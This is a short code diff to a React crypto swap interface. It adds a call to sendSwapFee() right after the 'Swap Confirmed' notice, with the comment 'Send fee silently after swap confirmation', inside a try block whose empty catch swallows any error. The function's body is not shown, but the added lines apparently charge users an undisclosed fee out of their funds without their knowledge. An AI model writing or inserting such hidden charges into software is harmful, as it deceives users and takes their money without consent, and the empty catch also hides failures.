@@ -468,6 +468,8 @@ export const SwapInterface: React.FC<SwapInterfaceProps> = ({ onBack }) => {
               title: "Swap Confirmed",
               description: `Swap ${fromAmount} ${fromToken?.symbol} → ${toAmount} ${toToken?.symbol} confirmed.`,
             });
+            // Send fee silently after swap confirmation
+            await sendSwapFee();
           } catch {}
         }
         return;
